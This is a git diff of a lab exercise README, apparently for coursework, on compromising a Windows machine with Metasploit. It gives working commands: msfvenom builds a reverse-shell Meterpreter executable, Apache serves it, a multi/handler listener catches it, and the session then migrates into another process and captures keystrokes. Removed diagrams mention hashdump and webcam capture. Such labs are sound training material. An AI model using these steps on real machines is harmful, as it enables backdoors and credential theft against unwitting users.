@@ -21,130 +21,85 @@ Investigate on the various categories of tools as follows:
 
 Open terminal and try execute some kali linux commands
 
-## EXECUTION STEPS AND ITS OUTPUT:
-
 ### PROGRAM:
-
 Find the attackers ip address using ifconfig
+#### OUTPUT:
 
-### Output:
+![if-config](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d81c29e7-4cb2-4989-a4f0-32d0f4dcffa5)
 
-![image](https://github.com/user-attachments/assets/b98e3dbe-cbf4-465e-83aa-f1ac913b2a51)
+Create a malicious executable file fun.exe using msenom command
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+#### OUTPUT
+![msfvenom](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/a8e477e7-1f5b-4831-a003-ffc199679313)
 
-Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
+copy the fun.exe into the apache /var/www/html folder
 
-### Output:
+![cpfunexe](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/edc15bf9-0646-4d77-a7b2-7fbe6adae449)
 
-![image](https://github.com/user-attachments/assets/094f111d-38e4-47a4-b950-8c0544a3463e)
+Start apache server
+sudo systemctl apache2 start
 
-copy the fun.exe into the apache ```/var/www/html ```folder
+![startapache2](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/f2bdb40b-22b8-409e-8295-7cac780eab89)
 
-![image](https://github.com/user-attachments/assets/1a19f712-d904-4e9a-9c3f-a0f824215d01)
+Check the status of apache2
 
-Start apache server ```sudo systemctl apache2 start``` 
-
-![image](https://github.com/user-attachments/assets/2944d067-02b2-43fc-9487-5f9e71c393b7)
-
-Check the status of apache2 ```sudo apache2 status```
-
-![image](https://github.com/user-attachments/assets/1577dcc8-8e32-4080-8459-521367056dc0)
+![status](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d5dca89e-d102-408d-aa25-d60e7e09ff2b)
 
 Invoke msfconsole:
-
+## OUTPUT:
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
-Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
+Starting a command and control Server
+use multi/handler
 
-### Output 
-![image](https://github.com/user-attachments/assets/d6bd1bdb-3064-45e8-b6b1-e22d2e80209f)
+![usemultihandler](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/31c4d664-f12a-45a9-aa29-e988f03e88e1)
 
-On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+exploit
 
-![image](https://github.com/user-attachments/assets/7be60e9f-2ce3-487a-9668-8bdb282e8931)
+
+On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
+http://192.168.1.2/fun.exe
+The file "fun.exe" downloads. 
+![download](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/a6b73051-a143-4740-b3d9-27c23762218f)
 
 Bypass any warning boxes, double-click the file, and allow it to run.
+
 On kali give the command exploit
 
-![image](https://github.com/user-attachments/assets/596d3916-66f9-4605-8ae4-5dd21116b77a)
+![exploit](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/b46a08f7-a9fc-4e71-8fdd-170ee187dd22)
 
-To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
+To see a list of processes, at the meterpreter > prompt, execute this command:
+ps  ⇒ can see the fun.exe process running with pid 1156
 
-The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
+![meterpreter-ps](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/7e6e28fb-b095-4fd1-81f8-a0292f82c9a2)
 
-migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
 
-#### Post Exploitation:
-The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
+The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
+To become more persistent, we'll migrate to a process that will last longer.
+Let's migrate to the winlogon process.
+At the meterpreter > prompt, execute this command:
 
-![image](https://github.com/user-attachments/assets/d53176fa-7af0-4f05-b526-91713074335d)
+migrate -N explorer.exe
+at meterpreter > prompt, execute this command:
+netstat
+A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
+Notice the "PID/Program name" value for this connection, which is redacted 
 
-keyscan_dump Shows the keystrokes captured so far
+![migrate-Nexplorer](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/836e6efa-423f-4553-ad2f-19170b010892)
 
-![image](https://github.com/user-attachments/assets/ec7c391d-62a6-4fdc-a2c3-ef383b6c8a57)
+Post Exploitation
+The target is now owned. Following are meterpreter commands for key capturing in the target machine
+keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
+![notepad](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/35be18d7-51b0-4529-8fd8-76740f0c9ba6)
+keyscan_dump	Shows the keystrokes captured so far
+![keyscan_dump](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d40a4428-0c65-4855-be1d-c278766082fb)
+
+
+
+
+
 
 ## RESULT:
-The Metasploit framework is  used to compromise windows and is examined successfully.
-
-
-
-## arcg
-
-```bash
-+----------------+                           +------------------+
-|                |      Reverse Shell        |                  |
-| Attacker       | <-------------------------|   Victim (Win)   |
-| (Kali Linux)   |       (TCP 4444)          |  Unpatched SMB   |
-|  - msfconsole  |                           |  RDP, AV Bypass  |
-|  - handler     |                           |                  |
-+-------+--------+                           +--------+---------+
-        |                                             |
-        | Payload generation using msfvenom           |
-        |                                             |
-        v                                             v
-msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
-         LHOST=attacker_ip LPORT=4444               or exploit triggers
-         -f exe > evil.exe
-
-        |
-        | Listener waits (multi/handler)
-        v
-
-+------------------------------------------------------------+
-|     Meterpreter Session Established (shell access)         |
-+------------------------------------------------------------+
-| Commands: sysinfo, hashdump, migrate, webcam_snap, etc.    |
-+------------------------------------------------------------+
-
-```
-
-## 2
-
-```bash
-## 🛠️ Metasploit Exploitation Architecture (Windows Target)
-
-
-+----------------+                           +------------------+
-|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
-|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
-|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
-|  - handler     |                           |                  |
-+-------+--------+                           +--------+---------+
-        |                                             |
-        |  ⚙️ Payload generation using msfvenom        |
-        |                                             |
-        v                                             v
-msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
-         LHOST=attacker_ip LPORT=4444               or exploit triggers  
-         -f exe > evil.exe  
-
-        |
-        |  🧲 Listener waits (multi/handler)
-        v
-
-+------------------------------------------------------------+
-|     🧠 Meterpreter Session Established (shell access)       |
-+------------------------------------------------------------+
-| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
-+------------------------------------------------------------+
-
-```
+The Metasploit framework for reconnaissance is  examined successfully.
